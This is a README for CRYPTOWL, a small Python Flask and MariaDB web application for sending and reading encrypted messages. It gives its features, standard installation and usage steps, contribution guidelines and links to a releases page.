# CRYPTOWL 🦉

![CRYPTOWL](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg) ![Flask](https://img.shields.io/badge/Flask-1.1.2-orange.svg)

CRYPTOWL is a simple web application written in Python (Flask) for sending and reading encrypted messages. This project aims to provide a beginner-friendly introduction to web development and cryptography using Flask and MariaDB. 

## Table of Contents

1. [Features](#features)
2. [Technologies Used](#technologies-used)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Contributing](#contributing)
6. [License](#license)
7. [Links](#links)

## Features

- **User Authentication**: Secure login and registration system.
- **Message Encryption**: Send and receive messages securely.
- **User-friendly Interface**: Clean and simple design for easy navigation.
- **Database Integration**: Uses MariaDB for storing user data and messages.
- **Responsive Design**: Works well on both desktop and mobile devices.

## Technologies Used

- **Python 3**: The programming language used for the backend.
- **Flask**: A lightweight WSGI web application framework.
- **MariaDB**: A popular open-source database.
- **HTML/CSS**: For building the user interface.
- **JavaScript**: For client-side functionality.

## Installation

To set up CRYPTOWL on your local machine, follow these steps:

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/ricikullz/CRYPTOWL.git
   cd CRYPTOWL
   ```

2. **Create a Virtual Environment**:

   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows use `venv\Scripts\activate`
   ```

3. **Install Required Packages**:

   ```bash
   pip install -r requirements.txt
   ```

4. **Set Up the Database**:

   Ensure you have MariaDB installed. Create a database and run the SQL scripts provided in the `database` folder to set up the necessary tables.

5. **Run the Application**:

   ```bash
   python app.py
   ```

   Visit `http://127.0.0.1:5000` in your web browser to access the application.

## Usage

Once you have installed and run the application, you can start using CRYPTOWL:

1. **Register an Account**: Click on the registration link to create a new user account.
2. **Log In**: Use your credentials to log in to the application.
3. **Send a Message**: Navigate to the message section to send an encrypted message to another user.
4. **Read Messages**: Check your inbox for any received messages.

For more details on using the application, refer to the documentation provided in the `docs` folder.

## Contributing

We welcome contributions to CRYPTOWL! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Create a pull request.

Please ensure that your code follows the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Links

You can download the latest release of CRYPTOWL [here](https://github.com/ricikullz/CRYPTOWL/releases). Follow the instructions in the release notes to execute the necessary files.

For more information, visit the [Releases](https://github.com/ricikullz/CRYPTOWL/releases) section.

---

Thank you for checking out CRYPTOWL! We hope you find it useful for your projects and learning journey.